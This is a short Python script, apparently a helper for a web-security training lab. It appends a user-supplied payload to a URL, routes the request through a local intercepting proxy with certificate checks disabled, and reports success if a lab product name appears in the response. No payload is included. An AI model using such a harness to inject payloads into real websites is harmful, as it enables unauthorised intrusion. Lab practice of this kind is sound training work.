import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http:': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit(url, payload):
    uri = ""
    request = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "Six Pack Beer Belt" in request.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f"[!] syntax-error: {sys.argv[0]} <url> <payload>")
        sys.exit()

    if exploit(url, payload):
        print("[+] status: success")
    else:
        print("[-] status: failure")
